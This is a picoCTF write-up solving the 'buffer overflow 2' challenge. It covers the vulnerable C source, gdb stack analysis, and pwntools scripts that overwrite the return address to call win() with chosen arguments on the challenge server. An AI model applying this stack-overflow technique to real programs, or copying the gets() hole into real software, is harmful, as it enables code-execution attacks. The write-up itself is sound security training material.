# PicoCTF - buffer overflow 2

## Challenge Overview
**Title:** buffer overflow 2  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
Control the return address and arguments

Additional details will be available after launching your challenge instance.

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Analysis
This challenge is a continuation of the previous one in the series.  
We have to again override the return address and point it to `win()`.  
But, we also have to provide some arguments to it.

I will hop into `gdb` and begin.  
I set a breakpoint in `vuln` and after `gets()` to see the distance between the start of the buffer and the return address

```
(gdb) b *0x0804935a
Breakpoint 2 at 0x804935a
(gdb) r
Starting program: /home/giorgos/Downloads/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
AAAAAAA

Breakpoint 2, 0x0804935a in vuln ()
(gdb) x/32x $ebp-120
0xffffcc30:	0xf7f9ed40	0xf7f9ed87	0x00000001	0x41414141
0xffffcc40:	0x00414141	0xf7ffcfe8	0x00000507	0xf7f9d7a8
0xffffcc50:	0x0000001a	0xf7f9ed40	0xffffcc98	0xf7de533b
0xffffcc60:	0xf7f9ed40	0x0000000a	0x0000001a	0xf7e6feb2
0xffffcc70:	0xf7d828dc	0x0804c000	0xf7f9de34	0xf7f9eddc
0xffffcc80:	0xffffccc8	0xf7fdabb0	0x00000000	0x0804c000
0xffffcc90:	0x080493f0	0xf7ffcb60	0xffffccc8	0x080493d5
0xffffcca0:	0x0804a063	0x0804c000	0xffffccc8	0x080493dd
```
**Buffer start:** 0xffffcc3c
**Return Address:** 0xffffccac
**Address of win:** 0x08049296

So we need 112 As to reach the start of the return address

When the function returns, **esp**  will point to where the return address is stored and will become **ebp** for win.  
**win ebp:** 0xffffccac

So we need to find at what offsets from **ebp** the arguments are expected to be stored.
```
(gdb) disas win
Dump of assembler code for function win:
0x0804930c <+118>:	cmpl   $0xcafef00d,0x8(%ebp)
0x08049313 <+125>:	jne    0x804932f <win+153>
0x08049315 <+127>:	cmpl   $0xf00df00d,0xc(%ebp)
0x0804931c <+134>:	jne    0x8049332 <win+156>
```
The **first** argument is expected at **ebp + 0x8** and the **second** at **ebp + 0xc**.  
Since **ebp** points at the location of the return address we override, we simply need to override the next 12 bytes as well
0xffffccac  Return Address
0xffffccb0  Pad
0xffffccb4  First Argument
0xffffccb8  Second Argument

To create the payload I will use the following Python script
### Python Script
```python
from pwn import *


def reverse_string(addr):
    chunks = [addr[i:i+2] for i in range(0, len(addr), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(win_addr, arg_pad, arg1, arg2):
    payload = 'A'*28*4
    payload += reverse_string(win_addr)
    payload += arg_pad
    payload += reverse_string(arg1)
    payload += reverse_string(arg2)
    return payload


def main():
    win_addr = "08049296"
    arg1 = "CAFEF00D"
    arg2 = "F00DF00D"
    arg_pad = 'A'*4
    payload = construct_payload(win_addr, arg_pad,  arg1, arg2)
    print(payload)


main()
```
Now, I will use this in `gdb` and test it out
**Note:** Create a **flag.txt** in the same directory as the program
```
(gdb) r < <(printf "$(python generate_payload.py)")
...
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAA
my flag

Program received signal SIGSEGV, Segmentation fault.
```
And we see our flag.

Now to send the payload to the server I will use this Python script using `pwntools`
### Python Script
```python
from pwn import *

def reverse_string(addr):
    chunks = [addr[i:i+2] for i in range(0, len(addr), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)

def construct_payload(win_addr, arg_pad, arg1, arg2):
    payload = 'A'*28*4
    payload += reverse_string(win_addr)
    payload += arg_pad
    payload += reverse_string(arg1)
    payload += reverse_string(arg2)
    return payload.encode().decode('unicode_escape').encode('latin1')


def send_to_server(payload):
    # Connect to the remote server
    host = 'saturn.picoctf.net'
    port = 57556
    conn = remote(host, port)

    conn.sendline(payload)

    # Receive the server's response
    response = conn.recvall()
    # Close the connection
    conn.close()

    return response


def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def main():
    win_addr = "08049296"
    arg1 = "CAFEF00D"
    arg2 = "F00DF00D"
    arg_pad='A'*4
    payload = construct_payload(win_addr, arg_pad, arg1, arg2)
    server_output = send_to_server(payload)
    print(get_flag(server_output.decode('utf-8', errors='ignore')))


main()
```
```
$ python script.py          
[+] Opening connection to saturn.picoctf.net on port 57556: Done
[+] Receiving all data: Done (190B)
[*] Closed connection to saturn.picoctf.net port 57556
picoCTF{____REDACTED____}
```
## Solution
- Find distance of `buf` in `vuln()` from the return address
- Override return address with the address of `win()`
- 4 bytes after the return address place the two arguments 0xCAFEF00D and 0xF00DF00D